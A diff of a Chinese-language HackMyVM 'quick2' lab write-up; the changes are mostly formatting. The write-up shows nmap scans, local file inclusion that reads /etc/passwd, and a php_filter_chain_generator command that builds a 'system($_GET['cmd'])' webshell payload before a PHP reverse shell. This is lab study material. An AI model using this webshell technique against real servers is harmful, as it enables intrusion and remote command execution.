@@ -3,7 +3,7 @@ title: quick2
 tags:
   - sec/hackmyvm
 date: 2024-02-09T09:33:26
-lastmod: 2024-11-24T19:14:34
+lastmod: 2024-11-24T19:20:10
 toc: "true"
 draft: "false"
 ---
@@ -18,13 +18,18 @@ draft: "false"
 后面都是直接用 arp-scan 来扫描某一个网卡的下的局域网ip 了
 ## 端口扫描
 ![HMM_quick2_image_4|700](https://img.l1uyun.one/HMM_quick2_image_4.png)
+
 ```bash
 sudo nmap 192.168.10.4 -p22,80 -Pn -sT -sV -O -sC -oA  portscan/nmap
 ```
+
+
 ![HMM_quick2_image_5|750](https://img.l1uyun.one/HMM_quick2_image_5.png)
+
 ```bash
 sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script=vuln -oA  portscan/vuln
- ```
+```
+
 ![HMM_quick2_image_6|700](https://img.l1uyun.one/HMM_quick2_image_6.png)
 ## web 服务
 
@@ -32,13 +37,18 @@ sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script=vuln -oA  portscan/vuln
 尝试 local file include LFI
 获取到了/etc/passwd
 在 home 目录下有文件夹的有这两个用户
+
 ```bash
 andrew:x:1000:1000: Andrew Speed:/home/andrew:/bin/bash
 nick:x:1001:1001: Nick Greenhorn,,,:/home/nick:/bin/bash
 ```
+
 获得了 user. txt
+
 ![HMM_quick2_image_7|500](https://img.l1uyun.one/HMM_quick2_image_7.png)
+
 ![HMM_quick2_image_8|483](https://img.l1uyun.one/HMM_quick2_image_8.png)
+
 
 进行目录扫描 ferox 发现失效了, 以后还是先尝试 gobuster, 不行的话再 feroxbuster
 ![HMM_quick2_image_9|750](https://img.l1uyun.one/HMM_quick2_image_9.png)
@@ -48,17 +58,22 @@ nick:x:1001:1001: Nick Greenhorn,,,:/home/nick:/bin/bash
 ![HMM_quick2_image_10|479](https://img.l1uyun.one/HMM_quick2_image_10.png)
 2024-02-14-20:40:27
 这个工具是看大佬的 wp 视频知道了, 反正以后遇到使用 php 伪协议的, 就可以用这个工具了
+
 使用工具生成一个复杂的伪协议利用代码，获得一个 webshell
+
 ```bash
 python php_filter_chain_generator.py --chain "<?php echo system($_GET['cmd']) ?>"
 ```
+
 ![HMM_quick2_image_11|700](https://img.l1uyun.one/HMM_quick2_image_11.png)
+
 ![HMM_quick2_image_12|900](https://img.l1uyun.one/HMM_quick2_image_12.png)
 
 测试之后发现存在 nc，但是不能用
 只能 php 反向 shell 了, 上传一下, 然后执行
 
 ![HMM_quick2_image_13|900](https://img.l1uyun.one/HMM_quick2_image_13.png)
+
 ![HMM_quick2_image_14|800](https://img.l1uyun.one/HMM_quick2_image_14.png)
 ## php 反向 shell 获得立足点
 ![HMM_quick2_image_15](https://img.l1uyun.one/HMM_quick2_image_15.png)
